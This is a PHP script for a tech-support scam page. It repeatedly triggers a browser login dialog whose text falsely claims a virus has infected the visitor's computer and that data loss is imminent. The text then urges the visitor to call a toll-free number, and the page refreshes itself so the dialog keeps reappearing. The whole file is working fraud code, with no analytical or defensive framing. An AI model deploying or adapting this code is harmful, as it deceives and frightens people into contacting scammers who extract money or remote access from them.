<?php

    session_start();

    $_uy = 'dsdsj';
    $_py = 'bgrfd';

    if ($_SERVER['PHP_AUTH_USER'] != $_uy || $_SERVER['PHP_AUTH_PW'] != $_py ) {

        if(isset($_SESSION['login_attempts'])){ $_SESSION['login_attempts']++; }else{$_SESSION['login_attempts'] = 11;}

        if($_SESSION['login_attempts'] == 70){
            header('Location: security.php');
            exit;
        } else {

           header('WWW-Authenticate: Basic realm="Suspicious activity detected on your IP address due to harmful virus installed in your computer. Call Toll Free now @ +1-844-798-38029 for any assistance. Your data is at a serious risk.There is a system file missing due to some harmfull virus Debug malware error, system failure. Please contact technicians to rectify the issue.Please do not open internet browser for your security issue to avoid data corruption on your operating system. Please contact  technicians at Tollfree Helpline at @ +1-844-798-38029(Toll free) PLEASE DO NOT SHUT DOWN OR RESTART YOUR COMPUTER, DOING THAT MAY LEAD TO DATA LOSS AND FAILURE OF OPERATING SYSTEM , HENCE NON BOOTABLE SITUATION RESULTING COMPLETE DATA LOSS . CONTACT ADMINISTRATOR DEPARTMENT TO RESOLVE THE ISSUE ON TOLL FREE @ +1-844-798-38029"');
           header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
 $sec = "0";
 header("Refresh: $sec; url=$page");
         echo "<html><head><title></title></head><body>";


            exit;
        }
    } else {

        header('Location: security.php');

        exit;
    }
?>
